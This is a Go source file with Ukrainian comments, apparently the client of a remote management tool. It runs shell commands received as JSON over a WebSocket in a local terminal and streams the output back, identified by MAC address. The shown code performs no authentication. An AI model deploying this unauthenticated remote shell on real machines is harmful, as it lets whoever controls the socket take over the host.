package management

import (
	"Anthophila/information"
	"Anthophila/logging"
	"Anthophila/terminal"
	"encoding/json"
	"github.com/gorilla/websocket"
	"strings"
)

// Reader - структура, яка забезпечує обробку отриманих повідомлень через WebSocket.
type Reader struct{}

// NewReader створює новий екземпляр `Reader`.
func NewReader() *Reader {
	return new(Reader)
}

// ReadMessage обробляє повідомлення, отримані через WebSocket.
//
// Параметри:
// - ws: з'єднання WebSocket, з якого будуть читатися повідомлення.
//
// Опис:
// Ця функція постійно читає повідомлення з WebSocket з'єднання. У разі помилки, функція логує її і припиняє обробку.
func (r *Reader) ReadMessage(logAddress string, ws *websocket.Conn) {
	for {
		_, message, err := ws.ReadMessage()
		if err != nil {
			logging.Now().PrintLog(logAddress, "Error reading message: %v", err.Error())
		}
		logging.Now().PrintLog(logAddress, "Received: ", string(message))
	}
}

// Command - структура для зберігання інформації про команду, отриману через WebSocket.
type Command struct {
	SClient string `json:"sClient"`
	Command string `json:"command"`
}

var cmd Command

// myMessage - структура для обміну повідомленнями між клієнтами через WebSocket.
type myMessage struct {
	SClient string `json:"sClient"`
	RClient string `json:"rClient"`
	Message string `json:"message"`
}

// ReadMessageCommand обробляє отримані команди через WebSocket.
//
// Параметри:
// - wSocket: з'єднання WebSocket, з якого будуть читатися команди.
//
// Опис:
// Ця функція обробляє команди, отримані через WebSocket. Вона підтримує команди, що потребують взаємодії з терміналом,
// а також обробляє спеціальні команди, такі як `help`, `restart`, та `exit`.
func (r *Reader) ReadMessageCommand(logStatus bool, logAddress string, wSocket *websocket.Conn) {
	term := terminal.NewTerminalManager()
	if err := term.Start(); err != nil {
		if logStatus == true {
			logging.Now().PrintLog(logAddress, "Failed to start terminal: ", err.Error())
		}
	} else {
		Terminal(logStatus, logAddress, wSocket, term)
	}

	for {
		_, message, err := wSocket.ReadMessage()
		if err != nil {
			if logStatus == true {
				logging.Now().PrintLog(logAddress, "Error reading message: ", err.Error())
			}
			return
		}

		if err := json.Unmarshal(message, &cmd); err != nil {
			// Якщо розпарсити як JSON не вдалося, обробляємо як звичайний текст
			if logStatus == true {
				logging.Now().PrintLog(logAddress, "Received text message:", string(message))
			}
		} else {
			// Якщо розпарсити вдалося, працюємо з даними
			if cmd.Command == "help" {
				// Заповнення внутрішньої структури
				msg := myMessage{
					SClient: information.NewInfo().GetMACAddress(),
					RClient: cmd.SClient,
					Message: "Ми отримали від вас повідомлення. Наше ім'я: " + information.NewInfo().GetMACAddress() + ". Ваше повідомлення: " + string(message),
				}

				// Серіалізація в JSON
				jsonData, err := json.Marshal(msg)
				if err != nil {
					if logStatus == true {
						logging.Now().PrintLog(logAddress, "Error marshalling JSON:", err.Error())
					}
					continue
				}
				//log.Println("Json " + string(jsonData))
				if err := NewSender().sendMessageWith(logAddress, wSocket, jsonData); err != nil {
					if logStatus == true {
						logging.Now().PrintLog(logAddress, "Error sending message:", err.Error())
					}
				}
			} else {
				// Основний TerminalManager() для взаємодії з користувачем терміналом
				if strings.TrimSpace(cmd.Command) == "restart" || strings.TrimSpace(cmd.Command) == "exit" {
					term.Stop()
					managerTerm := terminal.NewTerminalManager()
					if err := managerTerm.Start(); err != nil {
						if logStatus == true {
							logging.Now().PrintLog(logAddress, "Failed to start terminal: %v", err.Error())
						}
					} else {
						term = managerTerm
						Terminal(logStatus, logAddress, wSocket, term)
					}
					continue
				}
				term.SendCommand(cmd.Command)
			}
		}
	}
}

// Terminal запускає горутину для обробки виходу термінала.
//
// Параметри:
// - wSocket: з'єднання WebSocket, з якого буде відправлено повідомлення.
// - term: екземпляр TerminalManager для керування терміналом.
//
// Опис:
// Функція запускає горутину, яка читає вихідні дані з термінала і відправляє їх через WebSocket.
// горутина буде працювати доти, доки є активний термінал, що видає вихідні дані, або доки не буде закрито саму програму.
func Terminal(logStatus bool, logAddress string, wSocket *websocket.Conn, term *terminal.TerminalManager) {
	go func() {
		for line := range term.GetOutput() {
			msg := myMessage{
				SClient: information.NewInfo().GetMACAddress(),
				RClient: cmd.SClient,
				Message: "{terminal:{" + strings.Trim(line, "\n") + "}}",
			}
			jsonData, err := json.Marshal(msg)
			if err != nil {
				if logStatus == true {
					logging.Now().PrintLog(logAddress, "Error marshalling JSON:", err.Error())
				}
				continue
			}
			if logStatus == true {
				logging.Now().PrintLog(logAddress, "Json ", string(jsonData))
			}
			if err := NewSender().sendMessageWith(logAddress, wSocket, jsonData); err != nil {
				if logStatus == true {
					logging.Now().PrintLog(logAddress, "Error sending message:", err.Error())
				}
			}
		}
	}()
}
